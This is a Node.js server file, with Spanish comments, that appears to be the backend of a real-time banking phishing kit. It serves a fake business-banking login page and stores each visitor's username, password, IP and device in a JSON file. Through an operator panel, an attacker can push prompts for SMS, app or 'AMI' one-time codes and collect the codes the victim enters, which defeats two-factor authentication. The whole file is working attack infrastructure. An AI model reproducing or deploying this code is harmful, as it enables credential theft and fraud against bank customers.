const http = require('http');
const fs = require('fs');
const path = require('path');

// DigitalOcean App Platform asigna PORT por variable de entorno (por defecto 8080)
const PORT = parseInt(process.env.PORT, 10) || 8080;
// En contenedores cloud (DigitalOcean, Docker, etc.) es obligatorio escuchar en 0.0.0.0
const HOST = '0.0.0.0';
const PUBLIC_DIR = __dirname;

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.descarga': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf'
};

// Almacén de sesiones con persistencia en disco para evitar pérdidas en reinicios o balanceadores
const SESSIONS_FILE = path.join(__dirname, 'sessions_data.json');
let sessions = {};

function loadSessions() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data && typeof data === 'object' && !Array.isArray(data)) {
        sessions = data;
      } else {
        sessions = {};
      }
    }
  } catch (_) {
    sessions = {};
  }
}

function saveSessions() {
  try {
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions || {}), 'utf8');
  } catch (_) {}
}

loadSessions();

function parseJsonBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (_) {
        resolve({});
      }
    });
  });
}

function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
  });
  res.end(JSON.stringify(data));
}

async function handleRequest(req, res) {
  try {
    const reqUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    let pathname = decodeURIComponent(reqUrl.pathname);

    // Manejo de preflight CORS
    if (req.method === 'OPTIONS') {
      res.writeHead(204, {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
      });
      return res.end();
    }

    // Endpoints de comprobación de estado (Health Checks) para DigitalOcean / Cloud
    if (pathname === '/health' || pathname === '/healthz' || pathname === '/ping') {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('OK');
    }

    // ==========================================
    // API de Sesiones en tiempo real para el Panel
    // ==========================================

    // 0. Sincronización bidireccional entre panel y servidores (resiliente ante balanceadores)
    if (pathname === '/api/sessions/sync' && req.method === 'POST') {
      loadSessions();
      const body = await parseJsonBody(req);
      if (Array.isArray(body.sessions) && body.sessions.length > 0) {
        body.sessions.forEach((s) => {
          if (s && s.id) {
            const existing = sessions[s.id];
            sessions[s.id] = {
              ...(existing || {}),
              ...s,
              action: (s.action !== undefined) ? s.action : (existing ? existing.action : null),
              token: (s.token !== undefined && s.token !== '') ? s.token : (existing ? existing.token : ''),
              state: s.state || (existing ? existing.state : 'waiting'),
              last_seen: Math.max(s.last_seen || 0, existing ? (existing.last_seen || 0) : 0, Date.now()),
              updatedAt: Date.now()
            };
          }
        });
        saveSessions();
      }
      const now = Date.now();
      const list = Object.values(sessions).map((s) => ({
        ...s,
        online: now - s.last_seen < 35000
      }));
      return sendJson(res, 200, list);
    }

    // 1. Obtener todas las sesiones (para el panel de operador)
    if (pathname === '/api/sessions' && req.method === 'GET') {
      loadSessions();
      const now = Date.now();
      const list = Object.values(sessions).map((s) => {
        const online = now - s.last_seen < 35000;
        return { ...s, online };
      });
      return sendJson(res, 200, list);
    }

    // 2. Crear o actualizar sesión (desde el login de empresas)
    if (pathname === '/api/sessions' && req.method === 'POST') {
      loadSessions();
      const body = await parseJsonBody(req);
      const { id, username, password, tipoUsuario, device, state } = body;
      if (!id) return sendJson(res, 400, { error: 'Missing session id' });

      const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
      const now = Date.now();

      if (sessions[id]) {
        sessions[id] = {
          ...sessions[id],
          username: username || sessions[id].username,
          password: password || sessions[id].password,
          tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
          device: device || sessions[id].device,
          ip: body.ip || clientIp,
          state: state || sessions[id].state,
          last_seen: now,
          updatedAt: now
        };
      } else {
        sessions[id] = {
          id,
          index: Object.keys(sessions).length + 1,
          username: username || '—',
          password: password || '—',
          tipoUsuario: tipoUsuario || 'EMPRESAS',
          device: device || 'desktop',
          ip: body.ip || clientIp,
          state: state || 'waiting',
          token: '',
          createdAt: now,
          last_seen: now,
          updatedAt: now
        };
      }
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 3. Ping keepalive de la sesión
    const pingMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/ping$/);
    if (pingMatch && req.method === 'POST') {
      loadSessions();
      const id = pingMatch[1];
      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
      sessions[id].last_seen = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true });
    }

    // 4. Enviar token / código ingresado por el usuario
    const tokenMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/token$/);
    if (tokenMatch && req.method === 'POST') {
      loadSessions();
      const id = tokenMatch[1];
      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
      const body = await parseJsonBody(req);
      sessions[id].token = body.token || '';
      const currentAction = sessions[id].action;
      if (currentAction === 'ami') {
        sessions[id].state = 'received-ami';
      } else if (currentAction === 'bdvapp') {
        sessions[id].state = 'received-bdvapp';
      } else {
        sessions[id].state = 'received-sms';
      }
      sessions[id].action = null;
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 5. Asignar acción desde el panel de operador (sms, ami, bdvapp, error-login, done, etc.)
    const actionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/action$/);
    if (actionMatch && req.method === 'POST') {
      loadSessions();
      const id = actionMatch[1];
      const body = await parseJsonBody(req);
      if (!sessions[id]) {
        sessions[id] = {
          id,
          username: body.username || '—',
          password: body.password || '—',
          tipoUsuario: 'EMPRESAS',
          device: 'desktop',
          ip: '127.0.0.1',
          state: 'waiting',
          token: '',
          createdAt: Date.now()
        };
      }
      sessions[id].state = body.state || sessions[id].state;
      sessions[id].action = body.action;
      if (body.action === 'sms' || body.action === 'ami' || body.action === 'bdvapp') {
        sessions[id].token = '';
      }
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 6. Cambiar estado de la sesión (ej. 'typing')
    const stateMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/state$/);
    if (stateMatch && req.method === 'POST') {
      loadSessions();
      const id = stateMatch[1];
      const body = await parseJsonBody(req);
      if (!sessions[id]) {
        sessions[id] = {
          id,
          username: body.username || '—',
          password: '—',
          tipoUsuario: 'EMPRESAS',
          device: 'desktop',
          ip: '127.0.0.1',
          state: body.state || 'typing',
          token: '',
          createdAt: Date.now()
        };
      } else {
        sessions[id].state = body.state || sessions[id].state;
      }
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 7. Consultar sesión individual (polling del cliente)
    const sessionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)$/);
    if (sessionMatch && req.method === 'GET') {
      loadSessions();
      const id = sessionMatch[1];
      let session = sessions[id];
      if (!session) {
        const qUser = reqUrl.searchParams.get('user');
        const qPass = reqUrl.searchParams.get('pass');
        if (qUser || qPass) {
          session = {
            id,
            username: qUser || '—',
            password: qPass || '—',
            tipoUsuario: 'EMPRESAS',
            device: 'desktop',
            ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '127.0.0.1',
            state: 'waiting',
            token: '',
            createdAt: Date.now(),
            last_seen: Date.now(),
            updatedAt: Date.now()
          };
          sessions[id] = session;
          saveSessions();
        } else {
          return sendJson(res, 404, { error: 'Session not found' });
        }
      }
      return sendJson(res, 200, session);
    }

    // 8. Limpiar todas las sesiones
    if (pathname === '/api/clear' && req.method === 'POST') {
      sessions = {};
      saveSessions();
      return sendJson(res, 200, { success: true });
    }

    // ==========================================
    // Servidor de archivos estáticos
    // ==========================================

    if (pathname === '/') {
      pathname = '/empresas.html';
    }

    // Redirigir /panel a /panel/ para mantener rutas relativas correctas
    if (pathname === '/panel') {
      res.writeHead(301, { Location: '/panel/' });
      return res.end();
    }
    if (pathname === '/panel/') {
      pathname = '/panel/index.html';
    }

    // Prevenir directory traversal
    const safePath = path.normalize(path.join(PUBLIC_DIR, pathname));
    if (!safePath.startsWith(PUBLIC_DIR)) {
      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('403 Prohibido');
    }

    fs.stat(safePath, (err, stats) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('404 No Encontrado');
      }

      let filePath = safePath;
      if (stats.isDirectory()) {
        filePath = path.join(safePath, 'index.html');
      }

      const ext = path.extname(filePath).toLowerCase();
      const contentType = MIME_TYPES[ext] || 'application/octet-stream';

      if (req.method === 'HEAD') {
        res.writeHead(200, { 'Content-Type': contentType });
        return res.end();
      }

      fs.readFile(filePath, (readErr, content) => {
        if (readErr) {
          res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
          return res.end('500 Error interno del servidor');
        }

        res.writeHead(200, { 'Content-Type': contentType });
        res.end(content);
      });
    });
  } catch (error) {
    res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('500 Error en la petición');
  }
}

const server = http.createServer(handleRequest);

server.listen(PORT, HOST, () => {
  console.log(`\n=========================================`);
  console.log(` Servidor Node.js activo`);
  console.log(` Escuchando en http://${HOST}:${PORT}`);
  console.log(` Panel de operador en http://${HOST}:${PORT}/panel`);
  console.log(`=========================================\n`);
});

server.on('error', (err) => {
  console.error('Error al iniciar el servidor:', err);
  process.exit(1);
});

// Manejo de señales para apagado limpio en contenedores cloud
process.on('SIGTERM', () => {
  console.log('Recibido SIGTERM, cerrando servidor...');
  server.close(() => process.exit(0));
});

process.on('SIGINT', () => {
  console.log('Recibido SIGINT, cerrando servidor...');
  server.close(() => process.exit(0));
});
